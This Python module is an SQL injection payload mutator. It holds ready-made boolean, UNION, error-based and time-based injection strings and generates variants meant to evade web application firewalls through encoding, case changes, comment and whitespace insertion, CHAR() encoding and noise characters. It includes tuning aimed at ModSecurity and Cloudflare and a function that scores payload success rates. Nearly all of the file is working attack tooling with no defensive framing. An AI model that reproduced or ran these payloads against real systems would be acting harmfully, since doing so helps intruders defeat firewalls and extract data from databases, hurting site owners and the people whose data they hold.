"""
Payload Mutator Module for SQL Injection
"""

import random
import string
import re
from typing import List, Dict
from utils.logger import setup_logger

class PayloadMutator:
    def __init__(self):
        self.logger = setup_logger()
        
        # Base payload templates
        self.base_payloads = {
            'boolean': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version--",
            ],
            'error': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            ],
            'time': [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(50000000,MD5(1))--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)>0--",
            ]
        }
        
        # WAF bypass techniques
        self.waf_bypasses = {
            'case_variation': lambda x: self._random_case(x),
            'encoding': lambda x: self._encode_payload(x),
            'comments': lambda x: self._add_comments(x),
            'whitespace': lambda x: self._modify_whitespace(x),
            'concatenation': lambda x: self._add_concatenation(x),
            'char_encoding': lambda x: self._char_encode(x),
        }
        
        # Common WAF signatures to bypass
        self.waf_signatures = [
            'union', 'select', 'and', 'or', 'sleep', 'benchmark',
            'version', 'database', 'user', 'information_schema',
            'substring', 'concat', 'extractvalue', 'floor', 'rand'
        ]
    
    def mutate_payloads(self, payloads: List[str], mutation_count: int = 5) -> List[str]:
        """Generate mutated versions of payloads"""
        mutated = []
        
        for payload in payloads:
            # Add original payload
            mutated.append(payload)
            
            # Generate mutations
            for _ in range(mutation_count):
                mutated_payload = self._mutate_single_payload(payload)
                if mutated_payload and mutated_payload not in mutated:
                    mutated.append(mutated_payload)
        
        return mutated
    
    def _mutate_single_payload(self, payload: str) -> str:
        """Mutate a single payload using various techniques"""
        try:
            # Choose random mutation technique
            technique = random.choice(list(self.waf_bypasses.keys()))
            mutator = self.waf_bypasses[technique]
            
            mutated = mutator(payload)
            
            # Sometimes combine multiple techniques
            if random.random() < 0.3:
                second_technique = random.choice(list(self.waf_bypasses.keys()))
                if second_technique != technique:
                    mutator = self.waf_bypasses[second_technique]
                    mutated = mutator(mutated)
            
            return mutated
            
        except Exception as e:
            self.logger.error(f"Error mutating payload: {str(e)}")
            return payload
    
    def _random_case(self, payload: str) -> str:
        """Random case variation"""
        result = []
        for char in payload:
            if char.isalpha():
                result.append(char.upper() if random.random() < 0.5 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _encode_payload(self, payload: str) -> str:
        """Apply various encoding techniques"""
        encoding_type = random.choice(['url', 'hex', 'double_url'])
        
        if encoding_type == 'url':
            # URL encode parts of the payload
            keywords = re.findall(r'\b(UNION|SELECT|AND|OR|FROM|WHERE)\b', payload, re.IGNORECASE)
            for keyword in keywords:
                encoded = ''.join(f'%{ord(c):02x}' for c in keyword)
                payload = payload.replace(keyword, encoded, 1)
        
        elif encoding_type == 'hex':
            # Convert some parts to hex
            if 'UNION' in payload.upper():
                hex_union = '0x554E494F4E'  # UNION in hex
                payload = payload.replace('UNION', hex_union, 1)
        
        elif encoding_type == 'double_url':
            # Double URL encode
            keywords = re.findall(r'\b(UNION|SELECT|AND|OR)\b', payload, re.IGNORECASE)
            for keyword in keywords:
                double_encoded = ''.join(f'%25{ord(c):02x}' for c in keyword)
                payload = payload.replace(keyword, double_encoded, 1)
        
        return payload
    
    def _add_comments(self, payload: str) -> str:
        """Add comments to break WAF patterns"""
        # Add inline comments
        keywords = re.findall(r'\b(UNION|SELECT|AND|OR|FROM)\b', payload, re.IGNORECASE)
        for keyword in keywords:
            comment_type = random.choice(['/**/', '/*comment*/', '#', '--'])
            if comment_type == '/**/':
                commented = '/**/'.join(keyword)
            elif comment_type == '/*comment*/':
                commented = f'/*{random.randint(1, 999)}*/'.join(keyword)
            else:
                commented = keyword
            payload = payload.replace(keyword, commented, 1)
        
        return payload
    
    def _modify_whitespace(self, payload: str) -> str:
        """Modify whitespace to bypass WAF"""
        # Replace spaces with various alternatives
        whitespace_options = ['/**/', '/*comment*/', '%20', '+', '\t', '\n']
        
        # Replace some spaces with alternatives
        words = payload.split()
        result = []
        for i, word in enumerate(words):
            result.append(word)
            if i < len(words) - 1:  # Don't add whitespace after last word
                if random.random() < 0.4:  # 40% chance to modify whitespace
                    result.append(random.choice(whitespace_options))
                else:
                    result.append(' ')
        
        return ''.join(result)
    
    def _add_concatenation(self, payload: str) -> str:
        """Add concatenation functions"""
        # MySQL concatenation
        if 'SELECT' in payload.upper():
            # Wrap column names in CONCAT
            columns = re.findall(r'SELECT\s+(.*?)\s+FROM', payload, re.IGNORECASE)
            if columns:
                column_list = columns[0]
                if ',' in column_list:
                    # Multiple columns
                    cols = [col.strip() for col in column_list.split(',')]
                    concat_cols = [f"CONCAT({col})" if random.random() < 0.5 else col for col in cols]
                    new_column_list = ','.join(concat_cols)
                    payload = payload.replace(column_list, new_column_list, 1)
        
        return payload
    
    def _char_encode(self, payload: str) -> str:
        """Use CHAR() function for character encoding"""
        # Encode some strings using CHAR function
        string_literals = re.findall(r"'([^']*)'", payload)
        for literal in string_literals:
            if len(literal) > 2:  # Only encode longer strings
                char_codes = [str(ord(c)) for c in literal]
                char_encoded = f"CONCAT(CHAR({','.join(char_codes)}))"
                payload = payload.replace(f"'{literal}'", char_encoded, 1)
        
        return payload
    
    def generate_advanced_payloads(self, base_payload: str, count: int = 10) -> List[str]:
        """Generate advanced mutated payloads"""
        payloads = []
        
        for i in range(count):
            mutated = base_payload
            
            # Apply multiple mutation techniques
            techniques = random.sample(list(self.waf_bypasses.keys()), 
                                     random.randint(1, 3))
            
            for technique in techniques:
                mutator = self.waf_bypasses[technique]
                mutated = mutator(mutated)
            
            # Add random noise
            if random.random() < 0.2:
                mutated = self._add_noise(mutated)
            
            payloads.append(mutated)
        
        return payloads
    
    def _add_noise(self, payload: str) -> str:
        """Add noise characters to bypass pattern matching"""
        noise_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')']
        
        # Add noise before/after keywords
        keywords = re.findall(r'\b(UNION|SELECT|AND|OR)\b', payload, re.IGNORECASE)
        for keyword in keywords:
            if random.random() < 0.5:
                noise = random.choice(noise_chars)
                payload = payload.replace(keyword, f"{noise}{keyword}", 1)
        
        return payload
    
    def optimize_payload_for_waf(self, payload: str, waf_type: str = 'generic') -> str:
        """Optimize payload for specific WAF type"""
        optimizations = {
            'mod_security': {
                'techniques': ['comments', 'whitespace', 'encoding'],
                'avoid': ['union', 'select', 'information_schema']
            },
            'cloudflare': {
                'techniques': ['case_variation', 'encoding', 'concatenation'],
                'avoid': ['sleep', 'benchmark', 'extractvalue']
            },
            'generic': {
                'techniques': ['case_variation', 'comments', 'whitespace'],
                'avoid': []
            }
        }
        
        config = optimizations.get(waf_type, optimizations['generic'])
        
        # Apply optimizations
        for technique in config['techniques']:
            mutator = self.waf_bypasses[technique]
            payload = mutator(payload)
        
        return payload
    
    def test_payload_effectiveness(self, payloads: List[str], test_function) -> Dict[str, float]:
        """Test payload effectiveness and return success rates"""
        results = {}
        
        for payload in payloads:
            try:
                success = test_function(payload)
                results[payload] = 1.0 if success else 0.0
            except:
                results[payload] = 0.0
        
        return results
